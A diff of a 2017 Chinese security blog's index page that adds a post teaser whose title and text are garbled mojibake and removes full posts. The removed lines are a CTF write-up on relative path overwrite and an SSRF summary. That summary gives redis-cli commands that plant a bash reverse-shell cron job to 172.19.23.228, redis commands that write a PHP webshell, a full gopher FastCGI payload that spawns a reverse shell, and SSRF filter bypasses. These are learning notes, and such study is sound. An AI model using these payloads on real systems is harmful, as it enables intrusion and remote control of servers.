@@ -50,6 +50,42 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2017-03-30T17:15:49.000Z"><a href="/2017/03/31/what-happen/">2017-03-31</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2017/03/31/what-happen/">what happen</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="�����Ƿ���googleʱ��������ʲo"><a href="#�����Ƿ���googleʱ��������ʲo" class="headerlink" title="�����Ƿ���googleʱ��������ʲô"></a>�����Ƿ���googleʱ��������ʲô</h1><p>��΢���Ͽ��������������⣬�������������������� www.google.com ���Ұ��»س�֮��������ʲô��������дһ���Լ������⣨�����������ص����ݣ���<br>
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/2017/03/31/what-happen/#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2017-03-26T14:33:21.000Z"><a href="/2017/03/26/pwnhub-writeup/">2017-03-26</a></time>
       
       
@@ -61,20 +97,14 @@
     <div class="entry">
       
         <h1 id="pwnhub-wp-大物必须过"><a href="#pwnhub-wp-大物必须过" class="headerlink" title="pwnhub wp 大物必须过"></a>pwnhub wp 大物必须过</h1><p>刚看的<strong>RPO (Relative Path Overwrite) 相对路径覆盖</strong>就被人用来出题了蛮放上来凑个数</p>
-<p><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank" rel="external">http://blog.innerht.ml/rpo-gadgets/</a></p>
-<p>原理大概就是利用浏览器和服务器对url编码的解析方式不同当我们访问<code>http://domain/1%2f2.php</code>时服务器会返回<code>http://domain/1/2.php</code>的内容而浏览器则会认为<code>1%2f2.php</code>为一个文件</p>
-<p>在这题的<code>52.80.19.55/classes.php</code>下是这样引入css的</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"../../classes.css"</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>如果我们访问<code>http://52.80.19.55/user.php/341/a/b/..%2f..%2f..%2f..%2fclasses.php</code></p>
-<p>服务器返回的是<code>http://52.80.19.55/classes.php</code></p>
-<p>而浏览器认为<code>..%2f..%2f..%2f..%2fclasses.php</code>是一个文件则引入的css是</p>
-<p><code>http://52.80.19.55/user.php/341/classes.css</code>即<code>http://52.80.19.55/user.php/341</code></p>
-<p>我们只要注册时在Your study vow里写上我们要执行的css<code>{}*{background-image:url(url)}</code>然后把上面的url通过bug report发出去之后收到的头里就有flag了<del>忘记截图了</del></p>
-
       
     </div>
     <footer>
       
+        
+          <div class="alignleft">
+            <a href="/2017/03/26/pwnhub-writeup/#more" class="more-link">Read More</a>
+          </div>
         
         
       
@@ -102,70 +132,14 @@
     </header>
     <div class="entry">
       
-        <h1 id="ssrf小结"><a href="#ssrf小结" class="headerlink" title="ssrf小结"></a>ssrf小结</h1><hr>
-<h2 id="ssrf的发现"><a href="#ssrf的发现" class="headerlink" title="ssrf的发现"></a>ssrf的发现</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">file_get_contents()  默认不支持gopher等协议</div><div class="line">fsockopen() 极少使用</div><div class="line">curl_exec() 默认不会<span class="number">302</span>跳转 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);可开启转跳</div></pre></td></tr></table></figure>
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">requests 不支持gopher等协议</div><div class="line">urllib 不支持gopher等协议 存在http头注入的漏洞</div><div class="line">pycurl 同curl_exec 默认支持gopher等协议但默认不支持302跳转 c.setopt(c.FOLLOWLOCATION, 1)开启转跳</div></pre></td></tr></table></figure>
-<p>黑盒测试时若无回显且状态码无变化我在测试学校的discuz论坛时无论是否存在端口状态码都为200可以利用<strong>ftp://</strong>连接测试是否存在ssrf若端口存在则触发ftp连接长时间后触发超时断开若不存在则快速断开</p>
-<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>gopher协议支持url编码所以可以传输换行符等字符       </p>
-<p>利用gopher协议可以模拟redis命令通过redis向服务器写文件</p>
-<p><a href="http://redisbook.com/preview/server/execute_command.html" target="_blank" rel="external">http://redisbook.com/preview/server/execute_command.html</a></p>
-<h3 id="写cron"><a href="#写cron" class="headerlink" title="写cron"></a>写cron</h3><p>redis命令为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h $1 flushall</div><div class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</div><div class="line">redis-cli -h $1 config set dir /var/spool/cron/</div><div class="line">redis-cli -h $1 config set dbfilename root</div><div class="line">redis-cli -h $1 save</div></pre></td></tr></table></figure>
-<p>可以通过抓取redis-cli和redis服务交互的数据流在url编码后构成gopher协议支持的exp</p>
-<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>在知道web路径时可以通过redis直接写webshell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /home/wwwroot/default/</div><div class="line">config set dbfilename redis.php</div><div class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
-<h3 id="写全局变量或session"><a href="#写全局变量或session" class="headerlink" title="写全局变量或session"></a>写全局变量或session</h3><p>redis和memccached常常用来存放全局变量和session可以通过gopher模拟命令更改全局变量和session值进行攻击</p>
-<p><a href="http://mp.weixin.qq.com/s?__biz=MzI0NjQxODg0Ng==&amp;mid=2247483798&amp;idx=1&amp;sn=65cdf852dffd63b9d4ec41c31d9a5365" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzI0NjQxODg0Ng==&amp;mid=2247483798&amp;idx=1&amp;sn=65cdf852dffd63b9d4ec41c31d9a5365</a></p>
-<h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p><a href="http://www.lijiejie.com/fastcgi-read-file-vulnerability-scan-py/" target="_blank" rel="external">http://www.lijiejie.com/fastcgi-read-file-vulnerability-scan-py/</a> </p>
-<p>fcgi_exp可以攻击fastcgi但fastcgi通常不对外网开发故可以通过ssrf+gopher攻击内网的fastcgi</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</div></pre></td></tr></table></figure>
-<h2 id="绕过ssrf过滤"><a href="#绕过ssrf过滤" class="headerlink" title="绕过ssrf过滤"></a>绕过ssrf过滤</h2><ul>
-<li>利用302转跳首先让网站访问一个正常的外网利用<code>header(&quot;Location: $scheme://$ip:$port/$data&quot;);</code>转跳至内网</li>
-<li>访问<code>http://127.0.0.1.xip.io</code>会被解析到<code>http://127.0.0.1</code></li>
-<li>十进制ip</li>
-<li>DNS重绑定有些ssrf检查会先检查域名解析的ip是否合法之后在访问这之间有两次域名解析可将DNS的ttl设为0这样本地DNS就不会缓存ipDNS在两次域名解析时返回不同的ip第一次合法第二次非法从而绕过保护</li>
-</ul>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-03-22T15:14:48.000Z"><a href="/2017/03/22/RPO/">2017-03-22</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/03/22/RPO/">RPO (Relative Path Overwrite) 相对路径覆盖</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="RPO-Relative-Path-Overwrite-相对路径覆盖"><a href="#RPO-Relative-Path-Overwrite-相对路径覆盖" class="headerlink" title="RPO (Relative Path Overwrite) 相对路径覆盖"></a>RPO (Relative Path Overwrite) 相对路径覆盖</h1><hr>
-<h2 id="什么RPO"><a href="#什么RPO" class="headerlink" title="什么RPO"></a>什么RPO</h2><p>RPO就是一种利用服务端与浏览器之间对 <strong>url编码</strong> 的处理方式不同所发起的攻击<br>可以导致Web页面引入非法的css文件和javascript文件导致xss<br>
+        <h1 id="ssrf小结"><a href="#ssrf小结" class="headerlink" title="ssrf小结"></a>ssrf小结</h1>
       
     </div>
     <footer>
       
         
           <div class="alignleft">
-            <a href="/2017/03/22/RPO/#more" class="more-link">Read More</a>
+            <a href="/2017/03/26/ssrf/#more" class="more-link">Read More</a>
           </div>
         
         
@@ -182,7 +156,7 @@
 <nav id="pagination">
   
   
-    <a href="/page/2/" class="alignright next">Nächste Seite</a>
+    <a href="/page/2/" class="alignright next">Next</a>
   
   <div class="clearfix"></div>
 </nav></div></div>
